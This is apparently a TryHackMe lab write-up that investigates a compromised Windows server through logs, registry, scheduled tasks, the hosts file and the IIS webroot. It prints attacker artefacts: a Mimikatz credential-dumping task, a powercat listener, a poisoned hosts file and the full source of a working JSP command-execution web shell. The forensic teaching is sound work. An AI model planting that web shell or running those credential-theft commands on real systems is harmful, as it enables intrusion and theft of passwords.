# Investigating Windows

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information
```
Difficulty: Easy
OS: Windows
Subscription type: Free
Description: A windows machine has been hacked, its your job to go investigate this windows machine 
             and find clues to what the hacker might have done.
```
Room link: [https://tryhackme.com/r/room/investigatingwindows](https://tryhackme.com/r/room/investigatingwindows)

## Solution

### Connect via RDP

We start by connecting via RDP with `xfreerdp`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
└─$ xfreerdp /v:10.10.95.87 /cert:ignore /u:Administrator /p:letmein123! /h:960 /w:1500 +clipboard 
[15:04:33:834] [201350:201351] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[15:04:33:834] [201350:201351] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
<---snip--->
```
Next, we open both an elevated command prompt (cmd.exe) window and a PowerShell window.

### Whats the version and year of the windows machine?

We can get this information with a combination of `systeminfo` and `findstr` in the `cmd.exe` window
```
C:\Users\Administrator>systeminfo | findstr /i os
Host Name:                 EC2AMAZ-I8UHO76
OS Name:                   Microsoft Windows Server 2016 Datacenter
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
BIOS Version:              Amazon EC2 1.0, 10/16/2017
```

### Which user logged in last?

That ought to be `Administrator` since we logged in via RDP (logon type 10) very recently...

But we can get this information with `net user` in the cmd.exe window.  
First we list all local users
```
C:\Users\Administrator>net user

User accounts for \\EC2AMAZ-I8UHO76

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
Jenny                    John
The command completed successfully.
```

Then we check each user's last logon time like this
```
C:\Users\Administrator>net user john
User name                    John
Full Name                    John
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/2/2019 5:48:19 PM
Password expires             Never
Password changeable          3/2/2019 5:48:19 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/2/2019 5:48:32 PM                 <------ Here !

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
```

Alternatively, we can check the security event log for event IDs 4624 (An account was successfully logged on) with `Get-EventLog` and `Select-Object` in the PowerShell window
```powershell
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{Logname='Security';ID=4624} -MaxEvents 10 | Select-Object @{N='User'; E={$_.Properties[5].Value}}, TimeCreated

User          TimeCreated
----          -----------
SYSTEM        9/14/2024 1:13:01 PM
SYSTEM        9/14/2024 1:11:45 PM
Administrator 9/14/2024 1:04:34 PM          <-------- Here!
DWM-3         9/14/2024 1:04:34 PM
DWM-3         9/14/2024 1:04:34 PM
Administrator 9/14/2024 1:04:32 PM
Administrator 9/14/2024 12:59:32 PM
DWM-3         9/14/2024 12:59:32 PM
DWM-3         9/14/2024 12:59:32 PM
SYSTEM        9/14/2024 12:51:18 PM
```

### When did John log onto the system last?
 
We have already seen this in question #2
```
C:\Users\Administrator>net user john
User name                    John
Full Name                    John
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/2/2019 5:48:19 PM
Password expires             Never
Password changeable          3/2/2019 5:48:19 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/2/2019 5:48:32 PM                 <------ Here !

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
```

### What IP does the system connect to when it first starts?

We can see this in the autostart `Run` registry key.  
Check from cmd.exe
```
C:\Users\Administrator>reg.exe QUERY "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
    UpdateSvc    REG_SZ    C:\TMP\p.exe -s \\10.34.2.3 'net user' > C:\TMP\o2.txt
```

Or check from PowerShell
```
PS C:\Users\Administrator> Get-Item "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"


    Hive: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion


Name                           Property
----                           --------
Run                            UpdateSvc : C:\TMP\p.exe -s \\10.34.2.3 'net user' > C:\TMP\o2.txt
```

### What two accounts had administrative privileges (other than the Administrator user)?

We can start by checking what users are currently in the local `Administrators` group
```
C:\Users\Administrator>net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Guest
Jenny
The command completed successfully.
```

### Whats the name of the scheduled task that is malicous.

We can check scheduled tasks with the `schtasks` command
```
C:\Users\Administrator>schtasks

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
Amazon Ec2 Launch - Instance Initializat N/A                    Disabled
check logged in                          9/14/2024 4:59:43 PM   Ready
Clean file system                        9/14/2024 4:55:17 PM   Ready
falshupdate22                            9/14/2024 2:19:04 PM   Ready
GameOver                                 9/14/2024 2:22:00 PM   Ready
update windows                           N/A                    Ready

Folder: \Microsoft
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
INFO: There are no scheduled tasks presently available at your access level.
<---snip--->
```
The list is quite long but we can start checking tasks in the root folder.

This task certainly looks suspicious
```
C:\Users\Administrator>schtasks /Query /TN "Clean file system" /V /FO LIST

Folder: \
HostName:                             EC2AMAZ-I8UHO76
TaskName:                             \Clean file system
Next Run Time:                        9/19/2021 4:55:17 PM
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        9/19/2021 6:37:36 AM
Last Result:                          -2147020576
Author:                               EC2AMAZ-I8UHO76\Administrator
Task To Run:                          C:\TMP\nc.ps1 -l 1348                  <----------- Here !
Start In:                             N/A
Comment:                              A task to clean old files of the system
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrator
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Daily
Start Time:                           4:55:17 PM
Start Date:                           3/2/2019
End Date:                             N/A
Days:                                 Every 1 day(s)
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled
```
The tool running is `powercat` - a netcat clone in PowerShell.

### What file was the task trying to run daily?

See question above and the `Task To Run` line.

#### What port did this file listen locally for?

See question above and the `Task To Run` line.

### At what date did the compromise take place?

See question above and the `Start Date` line.

### During the compromise, at what time did Windows first assign special privileges to a new logon?

We check the security event log for event IDs 4672 (Special privileges assigned to new logon) with `Get-EventLog` in the PowerShell window
```
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 25 -Oldest


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
2/13/2019 8:14:30 AM          4672 Information      Special privileges assigned to new logon....
2/13/2019 8:14:31 AM          4672 Information      Special privileges assigned to new logon....
2/13/2019 8:14:31 AM          4672 Information      Special privileges assigned to new logon....
3/2/2019 4:02:58 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:02:58 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:02:59 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:02:59 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:02:59 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:02:59 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:02:59 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:03:00 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:03:04 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:03:07 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:03:07 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:03:07 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:04:38 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:04:39 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:04:39 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:04:39 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:04:39 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:04:39 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:04:39 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:04:40 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:04:49 PM           4672 Information      Special privileges assigned to new logon....
3/2/2019 4:04:52 PM           4672 Information      Special privileges assigned to new logon....
```
From the hint we see that the answer is the event with a timestamp ending in `:49` seconds.

### What tool was used to get Windows passwords?

This schedule task runs the password dumping tool
```
C:\Users\Administrator>schtasks /Query /TN "GameOver" /V /FO LIST

Folder: \
HostName:                             EC2AMAZ-I8UHO76
TaskName:                             \GameOver
Next Run Time:                        9/19/2021 7:12:00 AM
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        9/19/2021 7:07:00 AM
Last Result:                          0
Author:                               EC2AMAZ-I8UHO76\Administrator
Task To Run:                          C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrator
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           4:47:00 PM
Start Date:                           3/2/2019
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        0 Hour(s), 5 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled
```
If you don't recognize the tool and it's syntax you may need to do some additional Googling.  
Or check the contents of the file `C:\TMP\mim-out.txt`.

### What was the attackers external control and command servers IP?

The answer can be found in the `hosts` file
```
C:\Users\Administrator>type c:\Windows\System32\Drivers\etc\hosts
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
10.2.2.2        update.microsoft.com
127.0.0.1  www.virustotal.com
127.0.0.1  www.www.com
127.0.0.1  dci.sophosupd.com
10.2.2.2        update.microsoft.com
127.0.0.1  www.virustotal.com
127.0.0.1  www.www.com
127.0.0.1  dci.sophosupd.com
10.2.2.2        update.microsoft.com
127.0.0.1  www.virustotal.com
127.0.0.1  www.www.com
127.0.0.1  dci.sophosupd.com
76.32.97.132 google.com                       <-----------
76.32.97.132 www.google.com                   <-----------
```

### What was the extension name of the shell uploaded via the servers website?

We check the root folder of IIS
```
C:\Users\Administrator>dir c:\inetpub\wwwroot
 Volume in drive C has no label.
 Volume Serial Number is F078-2619

 Directory of c:\inetpub\wwwroot

03/02/2019  04:47 PM    <DIR>          .
03/02/2019  04:47 PM    <DIR>          ..
03/02/2019  04:37 PM            74,853 b.jsp
03/02/2019  04:37 PM            12,572 shell.gif
03/02/2019  04:37 PM               657 tests.jsp
               3 File(s)         88,082 bytes
               2 Dir(s)  17,419,202,560 bytes free

```

And checks the contents of the `tests.jsp` file
```
C:\Users\Administrator>type c:\inetpub\wwwroot\tests.jsp
<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
out.println("Command: " + request.getParameter("cmd") + "<BR>");
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</pre>
</BODY></HTML>
```

### What was the last port the attacker opened?

From the hint we see that the answer is Firewall-related.

Let's launch the `Windows Firewall with Advanced Security` GUI, select Inbound Rules, and sort by the `Local Port`

![Firewall Rules on Investing Windows](Firewall_Rules_on_Investing_Windows.png)

### Check for DNS poisoning, what site was targeted?

We have already seen this in the `hosts` file. See above.

For additional information, please see the references below.

## References

- [EID 4624 - An account was successfully logged on](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624)
- [EID 4672 - Special privileges assigned to new logon](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672)
- [findstr - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)
- [Get-EventLog - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1)
- [Get-Item - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item?view=powershell-5.1)
- [Internet Information Services - Wikipedia](https://en.wikipedia.org/wiki/Internet_Information_Services)
- [Mimikatz - Github](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz - Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Net user - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865(v=ws.11))
- [powercat - GitHub](https://github.com/besimorhino/powercat)
- [reg query - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)
- [Remote Desktop Protocol - Wikipedia](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)
- [schtasks - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)
- [systeminfo - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo)
- [xfreerdp - Linux manual page](https://linux.die.net/man/1/xfreerdp)
